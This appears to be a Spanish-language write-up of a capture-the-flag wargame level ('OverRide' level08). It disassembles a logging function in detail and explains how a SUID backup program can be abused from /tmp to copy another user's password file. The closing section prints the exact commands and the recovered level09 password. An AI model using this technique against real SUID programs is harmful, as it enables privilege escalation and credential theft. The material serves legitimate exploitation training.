18. <+609>: Si el canary fue corrompido llama a `__stack_chk_fail@plt`.
19. <+614>: `leave` — restaura el stack frame.
20. <+615>: `ret` — retorna el control al sistema.

# **ANÁLISIS COMPLETO LINEA POR LINEA - function log_wrapper**

```asm
Dump of assembler code for function log_wrapper:
   0x00000000004008c4 <+0>:	push   rbp
   0x00000000004008c5 <+1>:	mov    rbp,rsp
   0x00000000004008c8 <+4>:	sub    rsp,0x130
   0x00000000004008cf <+11>:	mov    QWORD PTR [rbp-0x118],rdi
   0x00000000004008d6 <+18>:	mov    QWORD PTR [rbp-0x120],rsi
   0x00000000004008dd <+25>:	mov    QWORD PTR [rbp-0x128],rdx
   0x00000000004008e4 <+32>:	mov    rax,QWORD PTR fs:0x28
   0x00000000004008ed <+41>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004008f1 <+45>:	xor    eax,eax
   0x00000000004008f3 <+47>:	mov    rdx,QWORD PTR [rbp-0x120]
   0x00000000004008fa <+54>:	lea    rax,[rbp-0x110]
   0x0000000000400901 <+61>:	mov    rsi,rdx
   0x0000000000400904 <+64>:	mov    rdi,rax
   0x0000000000400907 <+67>:	call   0x4006f0 <strcpy@plt>
   0x000000000040090c <+72>:	mov    rsi,QWORD PTR [rbp-0x128]
   0x0000000000400913 <+79>:	lea    rax,[rbp-0x110]
   0x000000000040091a <+86>:	mov    QWORD PTR [rbp-0x130],0xffffffffffffffff
   0x0000000000400925 <+97>:	mov    rdx,rax
   0x0000000000400928 <+100>:	mov    eax,0x0
   0x000000000040092d <+105>:	mov    rcx,QWORD PTR [rbp-0x130]
   0x0000000000400934 <+112>:	mov    rdi,rdx
   0x0000000000400937 <+115>:	repnz scas al,BYTE PTR es:[rdi]
   0x0000000000400939 <+117>:	mov    rax,rcx
   0x000000000040093c <+120>:	not    rax
   0x000000000040093f <+123>:	lea    rdx,[rax-0x1]
   0x0000000000400943 <+127>:	mov    eax,0xfe
   0x0000000000400948 <+132>:	mov    r8,rax
   0x000000000040094b <+135>:	sub    r8,rdx
   0x000000000040094e <+138>:	lea    rax,[rbp-0x110]
   0x0000000000400955 <+145>:	mov    QWORD PTR [rbp-0x130],0xffffffffffffffff
   0x0000000000400960 <+156>:	mov    rdx,rax
   0x0000000000400963 <+159>:	mov    eax,0x0
   0x0000000000400968 <+164>:	mov    rcx,QWORD PTR [rbp-0x130]
   0x000000000040096f <+171>:	mov    rdi,rdx
   0x0000000000400972 <+174>:	repnz scas al,BYTE PTR es:[rdi]
   0x0000000000400974 <+176>:	mov    rax,rcx
   0x0000000000400977 <+179>:	not    rax
   0x000000000040097a <+182>:	lea    rdx,[rax-0x1]
   0x000000000040097e <+186>:	lea    rax,[rbp-0x110]
   0x0000000000400985 <+193>:	add    rax,rdx
   0x0000000000400988 <+196>:	mov    rdx,rsi
   0x000000000040098b <+199>:	mov    rsi,r8
   0x000000000040098e <+202>:	mov    rdi,rax
   0x0000000000400991 <+205>:	mov    eax,0x0
   0x0000000000400996 <+210>:	call   0x400740 <snprintf@plt>
   0x000000000040099b <+215>:	lea    rax,[rbp-0x110]
   0x00000000004009a2 <+222>:	mov    esi,0x400d4c
   0x00000000004009a7 <+227>:	mov    rdi,rax
   0x00000000004009aa <+230>:	call   0x400780 <strcspn@plt>
   0x00000000004009af <+235>:	mov    BYTE PTR [rbp+rax*1-0x110],0x0
   0x00000000004009b7 <+243>:	mov    ecx,0x400d4e
   0x00000000004009bc <+248>:	lea    rdx,[rbp-0x110]
   0x00000000004009c3 <+255>:	mov    rax,QWORD PTR [rbp-0x118]
   0x00000000004009ca <+262>:	mov    rsi,rcx
   0x00000000004009cd <+265>:	mov    rdi,rax
   0x00000000004009d0 <+268>:	mov    eax,0x0
   0x00000000004009d5 <+273>:	call   0x4007a0 <fprintf@plt>
   0x00000000004009da <+278>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004009de <+282>:	xor    rax,QWORD PTR fs:0x28
   0x00000000004009e7 <+291>:	je     0x4009ee <log_wrapper+298>
   0x00000000004009e9 <+293>:	call   0x400720 <__stack_chk_fail@plt>
   0x00000000004009ee <+298>:	leave  
   0x00000000004009ef <+299>:	ret    
End of assembler dump.
```

### **Líneas 0, 1, 4, 11, 18, 25, 32, 41, 45, 47, 54, 61, 64 y 67:**
```asm
0x00000000004008c4 <+0>:	push   rbp
0x00000000004008c5 <+1>:	mov    rbp,rsp
0x00000000004008c8 <+4>:	sub    rsp,0x130
0x00000000004008cf <+11>:	mov    QWORD PTR [rbp-0x118],rdi
0x00000000004008d6 <+18>:	mov    QWORD PTR [rbp-0x120],rsi
0x00000000004008dd <+25>:	mov    QWORD PTR [rbp-0x128],rdx
0x00000000004008e4 <+32>:	mov    rax,QWORD PTR fs:0x28
0x00000000004008ed <+41>:	mov    QWORD PTR [rbp-0x8],rax
0x00000000004008f1 <+45>:	xor    eax,eax
0x00000000004008f3 <+47>:	mov    rdx,QWORD PTR [rbp-0x120]
0x00000000004008fa <+54>:	lea    rax,[rbp-0x110]
0x0000000000400901 <+61>:	mov    rsi,rdx
0x0000000000400904 <+64>:	mov    rdi,rax
0x0000000000400907 <+67>:	call   0x4006f0 <strcpy@plt>
```

1.  <+0>: Guarda en lo alto del stack el valor de `RBP` (función `main`) `[rsp + 0x00]`. El `RSP` se desplaza 8 bytes.
2.  <+1>: Asigna a `RBP` el nuevo `RSP` para la función `log_wrapper()`.
3.  <+4>: Reserva (desplaza) `304 bytes` (0x130) en el stack de `log_wrapper()`.
4.  <+11>: Guarda el primer argumento `log_fp` en `[rbp-0x118]`.
5.  <+18>: Guarda el segundo argumento `filename` en `[rbp-0x120]`.
6.  <+25>: Guarda el tercer argumento `msg` en `[rbp-0x128]`.
7.  <+32>: Carga en `RAX` el valor del **Stack Canary** desde `fs:0x28`.
8.  <+41>: Guarda el **Stack Canary** en `[rbp-0x8]`.
9.  <+45>: Pone `EAX` a 0.
10. <+47>: Carga `filename` en `RDX`.
11. <+54>: Calcula la dirección de `[rbp-0x110]` que es la variable local `buf` y la carga en `RAX`.
12. <+61>: Copia `filename` en `RSI` — segundo argumento de `strcpy()`.
13. <+64>: Copia `buf` en `RDI` — primer argumento de `strcpy()`.
14. <+67>: Llama a `strcpy(buf, filename)` — copia el filename en `buf`.

### **Líneas 72, 79, 86, 97, 100, 105, 112, 115, 117, 120, 123, 127, 132, 135, 138, 145, 156, 159, 164, 171, 174, 176, 179, 182, 186, 193, 196, 199, 202, 205 y 210:**
```asm
0x000000000040090c <+72>:	mov    rsi,QWORD PTR [rbp-0x128]
0x0000000000400913 <+79>:	lea    rax,[rbp-0x110]
0x000000000040091a <+86>:	mov    QWORD PTR [rbp-0x130],0xffffffffffffffff
0x0000000000400925 <+97>:	mov    rdx,rax
0x0000000000400928 <+100>:	mov    eax,0x0
0x000000000040092d <+105>:	mov    rcx,QWORD PTR [rbp-0x130]
0x0000000000400934 <+112>:	mov    rdi,rdx
0x0000000000400937 <+115>:	repnz scas al,BYTE PTR es:[rdi]
0x0000000000400939 <+117>:	mov    rax,rcx
0x000000000040093c <+120>:	not    rax
0x000000000040093f <+123>:	lea    rdx,[rax-0x1]
0x0000000000400943 <+127>:	mov    eax,0xfe
0x0000000000400948 <+132>:	mov    r8,rax
0x000000000040094b <+135>:	sub    r8,rdx
0x000000000040094e <+138>:	lea    rax,[rbp-0x110]
0x0000000000400955 <+145>:	mov    QWORD PTR [rbp-0x130],0xffffffffffffffff
0x0000000000400960 <+156>:	mov    rdx,rax
0x0000000000400963 <+159>:	mov    eax,0x0
0x0000000000400968 <+164>:	mov    rcx,QWORD PTR [rbp-0x130]
0x000000000040096f <+171>:	mov    rdi,rdx
0x0000000000400972 <+174>:	repnz scas al,BYTE PTR es:[rdi]
0x0000000000400974 <+176>:	mov    rax,rcx
0x0000000000400977 <+179>:	not    rax
0x000000000040097a <+182>:	lea    rdx,[rax-0x1]
0x000000000040097e <+186>:	lea    rax,[rbp-0x110]
0x0000000000400985 <+193>:	add    rax,rdx
0x0000000000400988 <+196>:	mov    rdx,rsi
0x000000000040098b <+199>:	mov    rsi,r8
0x000000000040098e <+202>:	mov    rdi,rax
0x0000000000400991 <+205>:	mov    eax,0x0
0x0000000000400996 <+210>:	call   0x400740 <snprintf@plt>
```

1.  <+72>: Carga `msg` en `RSI`.
2.  <+79>: Calcula la dirección de `buf` en `RAX`.
3.  <+86>: Inicializa el contador de `repnz scas` a `0xffffffffffffffff`.
4.  <+97>: Copia `buf` en `RDX`.
5.  <+100>: Pone `RAX` a 0.
6.  <+105>: Carga el contador en `RCX`.
7.  <+112>: Copia `buf` en `RDI`.
8.  <+115>: `repnz scas` — calcula `strlen(buf)` = longitud del filename.
9.  <+117>: Copia el resultado en `RAX`.
10. <+120>: Aplica `NOT RAX`.
11. <+123>: `lea rdx, [rax-1]` — obtiene la longitud real de `buf`.
12. <+127>: Carga `254` (0xfe) en `EAX` — tamaño máximo del buffer.
13. <+132>: Copia `254` en `R8`.
14. <+135>: `sub r8, rdx` — calcula `254 - strlen(buf)` = bytes disponibles para `snprintf`.
15. <+138>: Calcula de nuevo la dirección de `buf` en `RAX`.
16. <+145>: Reinicializa el contador de `repnz scas` a `0xffffffffffffffff`.
17. <+156>: Copia `buf` en `RDX`.
18. <+159>: Pone `RAX` a 0.
19. <+164>: Carga el contador en `RCX`.
20. <+171>: Copia `buf` en `RDI`.
21. <+174>: `repnz scas` — calcula `strlen(buf)` de nuevo.
22. <+176>: Copia el resultado en `RAX`.
23. <+179>: Aplica `NOT RAX`.
24. <+182>: `lea rdx, [rax-1]` — longitud actual de `buf`.
25. <+186>: Calcula la dirección de `buf` en `RAX`.
26. <+193>: `add rax, rdx` — calcula `buf + strlen(buf)` — apunta al final de `buf`.
27. <+196>: Copia `msg` en `RDX` — cuarto argumento de `snprintf()`.
28. <+199>: Copia `254 - strlen(buf)` en `RSI` — segundo argumento de `snprintf()`.
29. <+202>: Copia `buf + strlen(buf)` en `RDI` — primer argumento de `snprintf()`.
30. <+205>: Pone `EAX` a 0.
31. <+210>: Llama a `snprintf(buf + strlen(buf), 254 - strlen(buf), msg)` — concatena `msg` al final de `buf`.

### **Líneas 215, 222, 227, 230, 235, 243, 248, 255, 262, 265, 268, 273, 278, 282, 291, 293, 298 y 299:**
```asm
0x000000000040099b <+215>:	lea    rax,[rbp-0x110]
0x00000000004009a2 <+222>:	mov    esi,0x400d4c
0x00000000004009a7 <+227>:	mov    rdi,rax
0x00000000004009aa <+230>:	call   0x400780 <strcspn@plt>
0x00000000004009af <+235>:	mov    BYTE PTR [rbp+rax*1-0x110],0x0
0x00000000004009b7 <+243>:	mov    ecx,0x400d4e
0x00000000004009bc <+248>:	lea    rdx,[rbp-0x110]
0x00000000004009c3 <+255>:	mov    rax,QWORD PTR [rbp-0x118]
0x00000000004009ca <+262>:	mov    rsi,rcx
0x00000000004009cd <+265>:	mov    rdi,rax
0x00000000004009d0 <+268>:	mov    eax,0x0
0x00000000004009d5 <+273>:	call   0x4007a0 <fprintf@plt>
0x00000000004009da <+278>:	mov    rax,QWORD PTR [rbp-0x8]
0x00000000004009de <+282>:	xor    rax,QWORD PTR fs:0x28
0x00000000004009e7 <+291>:	je     0x4009ee <log_wrapper+298>
0x00000000004009e9 <+293>:	call   0x400720 <__stack_chk_fail@plt>
0x00000000004009ee <+298>:	leave  
0x00000000004009ef <+299>:	ret    
```

1.  <+215>: Calcula la dirección de `buf` en `RAX`.
2.  <+222>: Carga en `ESI` la dirección del string `"\n"` en `0x400d4c`.
```bash
(gdb) x/s 0x400d4c
0x400d4c:	 "\n"
```
3.  <+227>: Copia `buf` en `RDI`.
4.  <+230>: Llama a `strcspn(buf, "\n")` — localiza el `\n` en `buf`.
5.  <+235>: Escribe `\0` en `buf[strcspn(buf, "\n")]` — elimina el `\n`:
```c
buf[strcspn(buf, "\n")] = '\0';
```
6.  <+243>: Carga en `ECX` la dirección del formato `"LOG: %s\n"` en `0x400d4e`.
```bash
(gdb) x/s 0x400d4e
0x400d4e:	 "LOG: %s\n"
```
7.  <+248>: Calcula la dirección de `buf` en `RDX`.
8.  <+255>: Carga `log_fp` en `RAX`.
9.  <+262>: Copia el formato en `RSI` — segundo argumento de `fprintf()`.
10. <+265>: Copia `log_fp` en `RDI` — primer argumento de `fprintf()`.
11. <+268>: Pone `EAX` a 0.
12. <+273>: Llama a `fprintf(log_fp, "LOG: %s\n", buf)` — escribe en el log.
13. <+278>: Carga el **Stack Canary** guardado en `[rbp-0x8]` en `RAX`.
14. <+282>: Aplica `XOR` con el canary original de `fs:0x28`.
15. <+291>: `je` — si coinciden termina normalmente.
16. <+293>: Si el canary fue corrompido llama a `__stack_chk_fail@plt`.
17. <+298>: `leave` — restaura el stack frame.
18. <+299>: `ret` — retorna el control a `main()`.


# Resumen del Flujo de Ataque para el Nivel 08

## 1. Lectura:

La vulnerabilidad está en `main()` — el programa construye la ruta de destino
anteponiendo `"./backups/"` al argumento:

```c
strcpy(dst_path, "./backups/");
strncat(dst_path, argv[1], 99 - strlen(dst_path));
fd = open(dst_path, 0xc1, 0x1b0);
```

El programa usa el directorio actual como base para construir la ruta de destino. Si nos movemos a `/tmp` y creamos la estructura de directorios necesaria, podemos hacer que el `open()` del destino funcione con una ruta
absoluta.

## 2. Vulnerabilidad:

* El programa abre `argv[1]` en modo lectura y lo copia en `"./backups/" + argv[1]`.
* No hay validación del argumento — podemos pasar una ruta absoluta.
* El binario es **SUID level09** — abre `argv[1]` con los privilegios de `level09`.
* El `.pass` de `level09` en `/home/users/level09/.pass` es legible con esos privilegios.

## 3. Explotación:

* **Paso 1:** Nos movemos a `/tmp` — el programa construirá el destino como
  `./backups/` relativo a `/tmp`.
* **Paso 2:** Creamos la estructura de directorios en `/tmp` para que el
  `open()` del destino no falle:
```bash
mkdir -p backups/home/users/level09/
```
* **Paso 3:** Ejecutamos el binario con la ruta absoluta del `.pass` de `level09`:
```bash
~/level08 /home/users/level09/.pass
```
Esto hace que:
- `fopen(argv[1], "r")` abre `/home/users/level09/.pass` con privilegios de `level09`.
- `open(dst_path, ...)` crea `./backups//home/users/level09/.pass` en `/tmp`.

# 6. Solución:

```bash
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

---

# 7. Conclusión:

El nivel 08 no requiere explotar ninguna vulnerabilidad de memoria. El vector de ataque es **path traversal** combinado con el uso del **directorio de trabajo**.
El programa construye la ruta de destino relativa al directorio actual. Si nos movemos a `/tmp` y creamos la estructura de directorios necesaria, el `open()` del destino funciona. Como el binario es SUID de `level09`, el `fopen()` del origen puede leer el `.pass` de `level09` que normalmente no es accesible para `level08`.